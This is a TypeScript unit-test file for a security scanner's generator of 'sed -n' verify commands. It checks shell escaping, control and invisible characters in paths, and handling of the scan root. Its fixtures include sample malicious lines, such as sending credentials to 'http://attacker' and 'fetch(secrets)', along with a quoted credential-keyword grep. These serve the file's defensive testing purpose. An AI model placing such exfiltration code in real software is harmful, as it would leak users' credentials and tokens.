/**
 * Deterministic unit tests for the #141 verify-command generator. Runs in
 * CI without spawn, fixture, or shell — gates the generator's data-driven
 * contract. Pairs with line-population tests at
 * `__tests__/hardening/soul-emit-line-population.test.ts` (regex emit
 * sites) and the corpus-gated release-smoke harness (Verify execution
 * against real fixtures).
 */

import { describe, it, expect } from "vitest";
import type { Evidence } from "../../src/types/finding-evidence";
import {
  firstLineFromEvidence,
  generateVerifyCommand,
  shellEscapePath,
} from "../../src/ui/verify-command";

describe("firstLineFromEvidence (#141)", () => {
  it("returns the first cited line on positive evidence", () => {
    const e: Evidence = {
      kind: "positive",
      lines: [
        { n: 12, content: "send(creds, 'http://attacker')", why: "exfil" },
        { n: 30, content: "log(creds)", why: "leak" },
      ],
    };
    expect(firstLineFromEvidence(e)).toBe(12);
  });

  it("returns the first observed line on absence evidence", () => {
    const e: Evidence = {
      kind: "absence",
      observed: {
        lines: [{ n: 7, content: "shell.exec(input)" }],
        summary: "high-risk capability without governance",
      },
      expected: [{ constraint: "input-validation", rationale: "..." }],
    };
    expect(firstLineFromEvidence(e)).toBe(7);
  });

  it("returns the positive half's first line on mixed evidence", () => {
    const e: Evidence = {
      kind: "mixed",
      positive: {
        lines: [{ n: 4, content: "fetch(secrets)", why: "exfil" }],
      },
      absence: {
        observed: { lines: [{ n: 18, content: "fs.write" }], summary: "x" },
        expected: [{ constraint: "y", rationale: "z" }],
      },
    };
    expect(firstLineFromEvidence(e)).toBe(4);
  });

  it("returns undefined when evidence is undefined", () => {
    expect(firstLineFromEvidence(undefined)).toBeUndefined();
  });

  it("returns undefined when positive lines array is empty", () => {
    const e: Evidence = { kind: "positive", lines: [] };
    expect(firstLineFromEvidence(e)).toBeUndefined();
  });

  it("returns undefined when absence observed.lines is empty", () => {
    const e: Evidence = {
      kind: "absence",
      observed: { lines: [], summary: "summary-only absence" },
      expected: [{ constraint: "c", rationale: "r" }],
    };
    expect(firstLineFromEvidence(e)).toBeUndefined();
  });
});

describe("generateVerifyCommand (#141)", () => {
  it("emits sed -n on file + evidence.lines[0].n", () => {
    expect(
      generateVerifyCommand({
        file: "src/leaky.ts",
        evidence: {
          kind: "positive",
          lines: [{ n: 42, content: "send(token)", why: "exfil" }],
        },
      })
    ).toBe("sed -n '42p' 'src/leaky.ts'");
  });

  it("falls back to legacy f.line when evidence is absent", () => {
    expect(
      generateVerifyCommand({ file: ".clinerules", line: 3 })
    ).toBe("sed -n '3p' '.clinerules'");
  });

  it("prefers evidence.lines[0].n over f.line when both are present", () => {
    expect(
      generateVerifyCommand({
        file: "a.ts",
        line: 99,
        evidence: {
          kind: "positive",
          lines: [{ n: 7, content: "x", why: "y" }],
        },
      })
    ).toBe("sed -n '7p' 'a.ts'");
  });

  it("returns undefined when neither evidence nor line is present", () => {
    expect(
      generateVerifyCommand({ file: "src/x.ts" })
    ).toBeUndefined();
  });

  it("returns undefined when file is missing even with a line", () => {
    expect(
      generateVerifyCommand({ line: 10 })
    ).toBeUndefined();
  });

  it("returns undefined when line is zero (1-based contract)", () => {
    expect(
      generateVerifyCommand({ file: "a.ts", line: 0 })
    ).toBeUndefined();
  });

  it("returns undefined when line is negative", () => {
    expect(
      generateVerifyCommand({ file: "a.ts", line: -3 })
    ).toBeUndefined();
  });

  it("returns undefined when line is non-integer", () => {
    expect(
      generateVerifyCommand({ file: "a.ts", line: 3.5 })
    ).toBeUndefined();
  });

  it("returns undefined when path contains control characters", () => {
    expect(
      generateVerifyCommand({ file: "src/\nbad.ts", line: 5 })
    ).toBeUndefined();
  });

  it("escapes single quotes in paths", () => {
    expect(
      generateVerifyCommand({ file: "src/it's.ts", line: 5 })
    ).toBe("sed -n '5p' 'src/it'\\''s.ts'");
  });

  it("emits no category-template fallbacks (governance, mcp, credential)", () => {
    // Governance-class finding without line — pre-#141 returned
    // 'hackmyagent scan-soul . --verbose'. Now must return undefined.
    expect(
      generateVerifyCommand({
        file: "SOUL.md",
        // checkId/category/attackClass are no longer read by the generator,
        // but the no-line case must still produce no Verify regardless.
      })
    ).toBeUndefined();
  });

  it("emits no credential-grep fallback (the .clinerules:3 user repro)", () => {
    // Pre-#141 behaviour for a credential finding without a line was:
    //   grep -in "key|token|secret|password" '.clinerules'
    // which returned 16 unrelated matches on the kitchen-sink fixture.
    // Now: undefined. Renderer omits the Verify line entirely.
    expect(
      generateVerifyCommand({ file: ".clinerules" })
    ).toBeUndefined();
  });
});

describe("generateVerifyCommand with a scanRoot (#286)", () => {
  // The rootful branch had no unit coverage at all: it was exercised only
  // end-to-end by `__tests__/cli/locatable-runnable-citations.test.ts`, whose
  // scan target is a temp directory and whose findings therefore all carry
  // TARGET-RELATIVE paths. No fixture in either suite produced a finding with
  // an absolute `file`, so deleting the `isAbsolute` guard and always joining
  // the root left both suites green while turning `/etc/app/config.ts` into
  // `<root>/etc/app/config.ts` — a Verify naming a path that does not exist.

  it("joins a target-relative file onto the root", () => {
    expect(
      generateVerifyCommand({ file: "app/config.ts", line: 10 }, "/srv/scan")
    ).toBe("sed -n '10p' /srv/scan/app/config.ts");
  });

  it("leaves an ALREADY-ABSOLUTE file alone instead of joining it under the root", () => {
    // The pin. `join('/srv/scan', '/var/data/config.ts')` is
    // '/srv/scan/var/data/config.ts', so the mutant is not equivalent: it emits
    // a command against a path the scan never read.
    expect(
      generateVerifyCommand({ file: "/var/data/config.ts", line: 10 }, "/srv/scan")
    ).toBe("sed -n '10p' /var/data/config.ts");
  });

  it("keeps the rootless form target-relative", () => {
    // The two forms must stay distinguishable: a caller with no durable root
    // still gets the previous behaviour rather than a fabricated absolute path.
    expect(
      generateVerifyCommand({ file: "app/config.ts", line: 10 })
    ).toBe("sed -n '10p' 'app/config.ts'");
  });

  it("still emits nothing for a finding with no line, root or no root", () => {
    expect(generateVerifyCommand({ file: "app/config.ts" }, "/srv/scan")).toBeUndefined();
    expect(generateVerifyCommand({ file: "app/config.ts" })).toBeUndefined();
  });

  it("makes a leading dash an operand rather than a flag", () => {
    // `citationPath`, unlike the older `shellEscapePath` the rootless branch
    // uses, prefixes `./` so `sed` cannot read the path as an option.
    expect(
      generateVerifyCommand({ file: "-rf/config.ts", line: 4 }, "")
    ).toBe("sed -n '4p' ./-rf/config.ts");
  });
});

/**
 * A display hazard in the SCAN ROOT must not silence the whole report (#368,
 * round 5).
 *
 * `citationPath` refuses any path containing an invisible character, because
 * such a path renders as something other than the bytes a command acts on.
 * Applying that test to the JOINED path made the ROOT able to veto every
 * finding: one `\p{Cf}` character in the directory the user chose to scan
 * suppressed the `Verify:` line for every finding in the report, including
 * findings whose own file name is plain ASCII and whose line is known.
 *
 * Measured on a directory named `zwj-<ZWJ>-proj`: three `Verify: sed` lines
 * before the change, zero after, while `SKILL.md:13` still printed. Score and
 * finding count were byte-identical, which is exactly why the regression
 * evidence for that change — "0 findings lost, 0 score movement" — could not
 * see it. Comparing findings and scores does not compare commands.
 *
 * The refusal is about ATTACKER-CONTROLLED names. `f.file` comes out of the
 * scanned tree and keeps the full test on both branches. The root is the
 * operator's own argument, so when it cannot be named the citation falls back
 * to the target-relative form — which is what this function emitted before the
 * root existed, and what it still emits with no root.
 */
describe("generateVerifyCommand: a hazardous root must not veto the citation (#368)", () => {
  const ZWJ = "‍";

  it("falls back to the target-relative form when the ROOT is unnameable", () => {
    const cmd = generateVerifyCommand({ file: "SKILL.md", line: 13 }, `/srv/zwj-a${ZWJ}b-proj`);
    // A command, not silence. Identical to the rootless form, so the fallback
    // cannot be worse than the behaviour that shipped before the root existed.
    expect(cmd).toBe("sed -n '13p' SKILL.md");
    expect(cmd).not.toContain(ZWJ);
  });

  it("still refuses when the FINDING'S OWN file is unnameable", () => {
    // The half that must NOT be relaxed: the fallback is for the root only.
    // A mutant that dropped the hazard test entirely would pass the case above
    // and fail here.
    expect(
      generateVerifyCommand({ file: `SKI${ZWJ}LL.md`, line: 13 }, "/srv/scan")
    ).toBeUndefined();
  });

  it("refuses when BOTH are unnameable", () => {
    expect(
      generateVerifyCommand({ file: `SKI${ZWJ}LL.md`, line: 13 }, `/srv/zwj-a${ZWJ}b-proj`)
    ).toBeUndefined();
  });

  it("an unnameable root does not resurrect a finding with no line", () => {
    // The fallback must not become a second route around "no line, no Verify".
    expect(
      generateVerifyCommand({ file: "SKILL.md" }, `/srv/zwj-a${ZWJ}b-proj`)
    ).toBeUndefined();
  });

  it("a clean root still produces the joined, runnable form", () => {
    // Non-vacuity: if the join stopped happening altogether, every assertion
    // above would still pass while #286's whole point was lost.
    expect(
      generateVerifyCommand({ file: "SKILL.md", line: 13 }, "/srv/scan")
    ).toBe("sed -n '13p' /srv/scan/SKILL.md");
  });
});

describe("shellEscapePath (#141)", () => {
  it("returns undefined on tab characters", () => {
    expect(shellEscapePath("a\tb")).toBeUndefined();
  });

  it("returns undefined on null bytes", () => {
    expect(shellEscapePath("a\0b")).toBeUndefined();
  });

  it("returns undefined on DEL character", () => {
    expect(shellEscapePath("a\x7fb")).toBeUndefined();
  });

  it("escapes embedded single quotes correctly", () => {
    expect(shellEscapePath("o'reilly.md")).toBe("'o'\\''reilly.md'");
  });

  it("wraps an ordinary path in single quotes", () => {
    expect(shellEscapePath("src/cli.ts")).toBe("'src/cli.ts'");
  });
});
